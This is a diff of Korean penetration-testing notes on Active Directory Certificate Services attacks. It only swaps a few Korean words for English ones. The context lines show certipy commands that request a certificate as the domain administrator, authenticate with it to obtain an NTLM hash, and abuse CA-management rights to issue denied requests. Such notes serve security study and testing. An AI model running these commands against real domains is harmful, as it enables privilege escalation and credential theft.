@@ -22,7 +22,7 @@ AD에서 사용하는 인증 방식 3가지:
 2. NTLM
 3. ADCS (PKINIT)
 
-PKINIT은 인증서를 사용한 Kerberos 인증이다. 유효한 인증서가 있으면 TGT를 요청할 수 있고, 그 과정에서 NTLM 해시를 획득할 수 있다.
+PKINIT은 인증서를 사용한 Kerberos 인증이다. 유효한 인증서가 있으면 TGT를 요청할 수 있고, 그 과정에서 NTLM hash를 획득할 수 있다.
 
 ### ADCS 존재 확인
 
@@ -82,7 +82,7 @@ certipy req -u '<user>@<domain>' -p '<pass>' -ca '<ca_name>' \
   -template '<template_name>' -upn 'administrator@<domain>' \
   -target <dc_fqdn> -dc-ip <dc_ip>
 
-# 획득한 인증서로 인증 → NTLM 해시 획득
+# 획득한 인증서로 인증 → NTLM hash 획득
 certipy auth -pfx administrator.pfx -domain <domain>
 ```
 
@@ -194,7 +194,7 @@ certipy ca -u user@domain -p pass -ca CA-NAME -target DC_IP \
 certipy ca -u user@domain -p pass -ca CA-NAME -target DC_IP \
   -issue-request 123
 
-# Step 4: 발급된 인증서 다운로드
+# Step 4: 발급된 인증서 download
 certipy req -u user@domain -p pass -ca CA-NAME -target DC_IP \
   -retrieve 123
 
@@ -404,7 +404,7 @@ certipy find -vulnerable -u <user> -p '<pass>' -dc-ip <dc_ip> -stdout
 certipy req -u '<user>@<domain>' -p '<pass>' -ca '<ca_name>' \
   -template '<template>' -upn '<target_upn>' -target <dc_fqdn>
 
-# pfx로 인증 및 NTLM 해시 획득
+# pfx로 인증 및 NTLM hash 획득
 certipy auth -pfx <file>.pfx -domain <domain> -dc-ip <dc_ip>
 
 # Shadow Credentials
